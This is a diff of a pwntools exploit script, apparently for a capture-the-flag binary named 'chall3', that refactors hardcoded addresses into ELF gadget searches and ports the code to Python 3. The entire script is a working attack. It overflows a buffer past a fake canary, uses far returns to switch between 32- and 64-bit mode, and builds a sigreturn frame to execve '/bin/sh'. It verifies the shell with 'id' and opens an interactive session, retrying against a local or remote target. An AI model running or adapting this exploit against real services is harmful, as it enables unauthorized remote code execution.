@@ -3,26 +3,32 @@ from pwn import *
 import sys
 
 HOST = ''
-PORT = 1234
+PORT = 11528
 
-LOCAL = True
+context(arch='amd64', os='linux')
+
+target_elf = ELF('../bin/chall3')
+
+GADGET_ESP_EBX_INT_RET = next(target_elf.search(bytes.fromhex('89dc37cd80'))) # xchg esp, ebx; aaa; int 0x80; retf
+GADGET_INT_RET         = GADGET_ESP_EBX_INT_RET + 3 # int 0x80; retf
+ADDR_RESTART           = target_elf.start
+GADGET_SYSCALL         = next(target_elf.search(bytes.fromhex('0f05'))) # syscall
+
 if len(sys.argv) > 1:
-	LOCAL = False
 	HOST = sys.argv[1]
 
 if len(sys.argv) > 2:
 	PORT = int(sys.argv[2])
 
-while True:
-
+def exploit_attempt():
 	try:
-		if LOCAL:
-			io = process('../chall3')
+		if HOST == '':
+			io = target_elf.process(level='warn')
 		else:
-			io = remote(HOST, PORT)
+			io = remote(HOST, PORT, level='warn')
 
-		canary  = p32(0x400144) # restart app
-		canary += p32(0x33)     # cs in x64
+		canary  = p32(ADDR_RESTART) # restart app
+		canary += p32(0x33)         # cs in x64
 
 		io.recvline()
 		io.send(canary)
@@ -30,56 +36,72 @@ while True:
 
 		context.clear(arch="i386")
 		x32     = SigreturnFrame(kernel='i386')
-		x32.eax = 0x0000000b    # SYS_execve
-		x32.ebx = 0x06000400    # /bin/sh
+		x32.eax = 0x0000000b        # SYS_execve
+		x32.ebx = target_elf.bss(0) # /bin/sh
 		x32.edx = 0x00
-		x32.ebp = 0x06000200
-		x32.esp = 0x06000400
-		x32.eip = 0x00400137    # int 0x80; retf
+		x32.ebp = target_elf.get_section_by_name('.data').header.sh_addr + 0x200
+		x32.esp = target_elf.bss(0)
+		x32.eip = GADGET_INT_RET    
 		x32.cs  = 0x23
 		x32.ss  = 0x2b
 
-		pay1  = cyclic(32)
-		pay1 += canary
-		pay1 += p64(0x400134)   # xchg esp, ebx; aaa; int 0x80; retf
-		pay1 += cyclic(4)       # eax will end up as 4 (SYS_write on x32)
+		payload1  = cyclic(32)
+		payload1 += canary
+		payload1 += p64(GADGET_ESP_EBX_INT_RET)
+		payload1 += cyclic(4)       # eax will end up as 4 (SYS_write on x32)
 
-		io.send(pay1)
+		io.send(payload1)
 		io.recvline()
 		io.send(canary)
 		io.recvline()
 
-		pay2  = cyclic(32)
-		pay2 += p32(0x4001da)   # restart app
-		pay2 += p32(0x33)       # cs in x64
-		pay2 += p64(0x400137)   # int 0x80; retf
-		pay2 += 'junkjunk'
-		pay2 += p32(0x400144)   # restart app
-		pay2 += p32(0x33)       # cs in x64
-		pay2 += cyclic(79)
-		pay2 += str(x32)[-17:]  # srop frame (the tail of the trimmed srop frame)
-		pay2 += '\x00'*(0x100-len(pay2))
+		payload2  = cyclic(32)
+		payload2 += p32(GADGET_SYSCALL) # restart app
+		payload2 += p32(0x33)           # cs in x64
+		payload2 += p64(GADGET_INT_RET)
+		payload2 += b'A'*8
+		payload2 += p32(ADDR_RESTART)   # restart app
+		payload2 += p32(0x33)           # cs in x64
+		payload2 += cyclic(79)
+		payload2 += bytes(x32)[-17:]    # srop frame (the tail of the trimmed srop frame)
+		payload2 += b'\x00'*(0x100-len(payload2))
 
-		io.send(pay2)
+		io.send(payload2)
 		io.recvline()
 		io.send(canary)
 		io.recvline()
 
-		pay3  = 'junkjunk'      # padding
-		pay3 += '/bin/sh\x00'   # canary
-		pay3 += 'x'*16          # padding
-		pay3 += '/bin/sh\x00'   # canary
-		pay3 += p64(0x400137)   # int 0x80; retf
-		pay3 += 'junkjunk'      # padding
-		pay3 += str(x32)[:-17]  # trim srop frame to fit (kills ss)
+		payload3  = b'B'*8              # padding
+		payload3 += b'/bin/sh\x00'      # canary
+		payload3 += b'C'*16             # padding
+		payload3 += b'/bin/sh\x00'      # canary
+		payload3 += p64(GADGET_INT_RET) # int 0x80; retf
+		payload3 += b'D'*8              # padding
+		payload3 += bytes(x32)[:-17]    # trim srop frame to fit (kills ss)
 
-		io.send(pay3)
+		io.send(payload3)
 
-		io.sendline('id')
-		log.success('shell: %s' % io.recvline().strip())
-		io.interactive()
-		break
-	except:
+		io.sendline(b'id')
+		id_result = io.recvline()
+		io.sendline(b'id')
+		id_result = io.recvline()
+		if b'uid=' in id_result:
+			log.success('shell: %s', id_result.decode('ascii').strip())
+			io.interactive()
+			return True
+		else:
+			log.failure('Error: %s', id_result)
+	except EOFError as e:
+		log.failure('Fail: EOF')
+	except Exception as e:
+		log.failure('Error: %s: %s', type(e), str(e))
+	finally:
 		io.close()
+	return False
 
-sys.exit()
+
+if __name__ == '__main__':
+	while True:
+		if exploit_attempt():
+			break
+
